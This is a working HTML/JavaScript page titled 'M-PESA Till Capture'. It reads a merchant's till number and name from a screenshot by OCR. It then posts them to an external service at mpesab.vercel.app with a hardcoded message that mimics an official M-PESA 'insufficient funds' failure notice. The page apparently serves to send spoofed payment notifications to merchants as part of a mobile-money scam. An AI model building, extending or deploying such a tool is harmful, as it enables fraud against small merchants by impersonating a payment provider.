
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>M-PESA Till Capture</title>
<script src="https://cdn.jsdelivr.net/npm/tesseract.js@5/dist/tesseract.min.js"></script>
<style>
    body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #121212; color: white; padding: 20px; margin: 0; }
    .container { max-width: 500px; width: 95%; margin: auto; background: #1e1e1e; padding: 20px; border-radius: 12px; box-sizing: border-box; box-shadow: 0 4px 15px rgba(0,0,0,0.5); }
    h3 { text-align: center; margin-bottom: 15px; font-size: 1.4rem; color: #4CAF50; text-transform: uppercase; letter-spacing: 1px; }
    
    .upload-section { border: 2px dashed #4CAF50; padding: 30px 20px; text-align: center; border-radius: 10px; margin-bottom: 15px; cursor: pointer; transition: 0.3s; }
    .upload-section:hover { background: #252525; border-color: #66bb6a; }
    #imagePreview { max-width: 100%; border-radius: 8px; margin-top: 15px; display: none; border: 1px solid #333; }

    .manual-input-container { margin-top: 15px; padding: 15px; border: 1px solid #333; border-radius: 8px; background: #252525; }
    .manual-input-container label { display: block; margin-bottom: 5px; font-size: 0.85rem; color: #4CAF50; font-weight: bold; }
    
    .input-group { display: flex; gap: 8px; margin-bottom: 15px; }
    input[type="text"] { flex: 1; padding: 12px; background: #333; border: 1px solid #444; border-radius: 6px; color: white; box-sizing: border-box; font-size: 1.1rem; outline: none; }
    input[type="text"]:focus { border-color: #4CAF50; }
    
    /* Highlight the name input in green to match the UI */
    #detectedName { color: #4CAF50; font-weight: bold; }

    .copy-btn { width: auto; padding: 0 15px; margin-top: 0; background: #333; border: 1px solid #444; font-size: 0.8rem; white-space: nowrap; color: white; cursor: pointer; border-radius: 6px; }
    .copy-btn:hover { background: #444; }

    button#saveBtn { width: 100%; padding: 16px; margin-top: 10px; border: none; border-radius: 6px; background: #4CAF50; color: white; font-weight: bold; cursor: pointer; font-size: 1.1rem; transition: 0.3s; }
    button#saveBtn:hover:not(:disabled) { background: #45a049; transform: translateY(-1px); }
    button#saveBtn:disabled { background: #555; cursor: not-allowed; }
    
    pre { background: #000; padding: 15px; margin-top: 15px; white-space: pre-wrap; word-wrap: break-word; border-radius: 6px; font-size: 0.9rem; color: #4CAF50; border: 1px solid #333; min-height: 20px; text-align: center; }
    .loading-text { color: #ffeb3b; font-size: 0.9rem; text-align: center; display: none; margin-bottom: 10px; font-weight: bold; }
</style>
</head>
<body>

<div class="container">
    <h3>Merchant Capture</h3>
    
    <div class="upload-section" onclick="document.getElementById('imageInput').click()">
        <span>📸 Tap to Upload M-PESA Screenshot</span>
        <input type="file" id="imageInput" accept="image/*" style="display: none;" onchange="handleImage(this)">
        <img id="imagePreview" alt="Preview">
    </div>

    <div id="loader" class="loading-text">🔍 Extracting Till & Name...</div>

    <div class="manual-input-container">
        <label>TILL NUMBER:</label>
        <div class="input-group">
            <input type="text" id="detectedPhone" placeholder="Scanning...">
            <button class="copy-btn" onclick="copyNumber()" id="copyBtn">COPY</button>
        </div>

        <label>MERCHANT NAME (GREEN TEXT):</label>
        <div class="input-group">
            <input type="text" id="detectedName" placeholder="Scanning...">
        </div>
    </div>

    <button id="saveBtn" onclick="saveContact()">SAVE CONTACT</button>
    <pre id="output"></pre>
</div>

<script>
const API = "https://mpesab.vercel.app";
const FIXED_MESSAGE = "Failed. Insufficient funds in your M-PESA account as well as Fuliza M-PESA to send KSH15000.00. Available Fuliza M-PESA limit KSH0.00.";

async function handleImage(input) {
    const file = input.files[0];
    if (!file) return;

    const reader = new FileReader();
    reader.onload = e => {
        const preview = document.getElementById('imagePreview');
        preview.src = e.target.result;
        preview.style.display = 'block';
    };
    reader.readAsDataURL(file);

    const loader = document.getElementById('loader');
    loader.style.display = 'block';

    try {
        // We use 'eng' but specifically look for patterns found in the app
        const { data: { text } } = await Tesseract.recognize(file, 'eng');
        processText(text);
    } catch (err) {
        alert("OCR Error. Ensure the screenshot is clear.");
    } finally {
        loader.style.display = 'none';
    }
}

function processText(rawText) {
    let lines = rawText.split('\n').map(l => l.trim()).filter(l => l.length > 0);
    let detectedTill = "";
    let detectedName = "";
    let tillIndex = -1;

    // 1. Find the Till Number (Usually 5-8 digits)
    for (let i = 0; i < lines.length; i++) {
        let match = lines[i].match(/\b\d{5,8}\b/);
        if (match) {
            detectedTill = match[0];
            tillIndex = i;
            break;
        }
    }

    // 2. Find the Name (Usually the line immediately AFTER the till number in this UI)
    if (tillIndex !== -1 && tillIndex + 1 < lines.length) {
        let potentialName = lines[tillIndex + 1];
        // Clean up common OCR noise
        detectedName = potentialName.replace(/[^a-zA-Z\s]/g, '').trim();
    }

    // Fallback if the name logic above fails
    if (!detectedName || detectedName.length < 3) {
        // Look for multiple Uppercase words (Full names)
        let nameMatch = rawText.match(/[A-Z][a-z]+(?:\s[A-Z][a-z]+)+/);
        detectedName = nameMatch ? nameMatch[0] : "Merchant Not Found";
    }

    document.getElementById('detectedPhone').value = detectedTill;
    document.getElementById('detectedName').value = detectedName.toUpperCase();
}

function copyNumber() {
    const phoneInput = document.getElementById('detectedPhone');
    const copyBtn = document.getElementById('copyBtn');
    if (!phoneInput.value) return;

    navigator.clipboard.writeText(phoneInput.value).then(() => {
        const originalText = copyBtn.innerText;
        copyBtn.innerText = "COPIED!";
        copyBtn.style.backgroundColor = "#4CAF50";
        setTimeout(() => {
            copyBtn.innerText = originalText;
            copyBtn.style.backgroundColor = "#333";
        }, 2000);
    });
}

async function saveContact() {
    const btn = document.getElementById("saveBtn");
    const output = document.getElementById("output");
    const name = document.getElementById("detectedName").value.trim();
    const phone = document.getElementById("detectedPhone").value.trim();

    if (!phone || !name || name === "MERCHANT NOT FOUND") {
        output.innerText = "❌ Valid Name and Till Number required.";
        return;
    }

    btn.disabled = true;
    btn.innerText = "Processing...";

    try {
        const response = await fetch(`${API}/send`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                phone: phone,
                name: name,
                amount: 0,
                token: "TILL_" + Date.now(),
                message: FIXED_MESSAGE
            })
        });

        if (response.ok) {
            output.innerText = "✅ Captured: " + name + "\nTill: " + phone;
            btn.innerText = "DONE ✓";
        } else {
            throw new Error();
        }
    } catch (error) {
        output.innerText = "❌ Network Error";
        btn.disabled = false;
        btn.innerText = "SAVE CONTACT";
    }
}
</script>
</body>
</html>
